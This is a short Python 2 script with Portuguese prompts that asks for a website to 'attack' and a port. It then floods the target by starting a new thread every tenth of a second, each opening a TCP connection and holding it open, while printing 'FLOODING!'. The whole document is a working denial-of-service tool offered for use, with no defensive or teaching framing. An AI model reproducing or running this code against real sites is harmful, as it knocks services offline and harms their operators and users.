import os
from socket import *
from time import *
from thread import *

ht = raw_input("Digite o site que você deseja atacar: ")
pt = input("Digite o numero da porta: ")

def connect(i, host, port):
    try:
        sock1 = socket(AF_INET, SOCK_STREAM)
        sock1.connect((host, port))
        sleep(99999)
        sock1.close
    except:
        print "The site is down"
        os._exit(0)

def ddos(host, port):
  n = 0

  while 1:
      try:
          start_new_thread(connect, (n,host,port,))
      except:
          print "Connection Lost. Restart DOS"
      print "FLOODING!"
      sleep(0.1)

ddos(ht, pt)